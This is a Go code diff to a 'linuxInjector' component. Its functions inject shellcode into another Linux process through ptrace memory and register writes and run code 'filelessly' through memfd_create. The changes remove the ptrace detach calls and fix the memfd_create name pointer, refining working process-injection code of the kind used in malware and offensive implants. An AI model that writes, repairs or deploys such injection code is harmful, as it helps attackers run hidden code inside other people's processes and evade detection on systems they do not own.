@@ -83,7 +83,6 @@ func (l *linuxInjector) injectPtrace(shellcode []byte) error {
 
 		_, err := syscall.PtracePokeData(pid, addr, chunk)
 		if err != nil {
-			syscall.PtraceDetach(pid)
 			return fmt.Errorf("PTRACE_POKEDATA failed at offset %d: %w", i, err)
 		}
 	}
@@ -95,20 +94,16 @@ func (l *linuxInjector) injectPtrace(shellcode []byte) error {
 		return fmt.Errorf("PTRACE_SETREGS failed: %w", err)
 	}
 
-	if err := syscall.PtraceDetach(pid); err != nil {
-		return fmt.Errorf("PTRACE_DETACH failed: %w", err)
-	}
-
 	return nil
 }
 
 // injectMemFD uses memfd_create for fileless execution.
 func (l *linuxInjector) injectMemFD(shellcode []byte) error {
-	name := ""
+	nameBytes, _ := syscall.BytePtrFromString("")
 	flags := 0
 
 	// memfd_create syscall number on x86 is 356
-	fd, _, errno := syscall.Syscall(356, uintptr(unsafe.Pointer(&name)), uintptr(flags), 0)
+	fd, _, errno := syscall.Syscall(356, uintptr(unsafe.Pointer(nameBytes)), uintptr(flags), 0)
 	if errno != 0 {
 		return fmt.Errorf("memfd_create failed: %v (kernel >= 3.17 required)", errno)
 	}
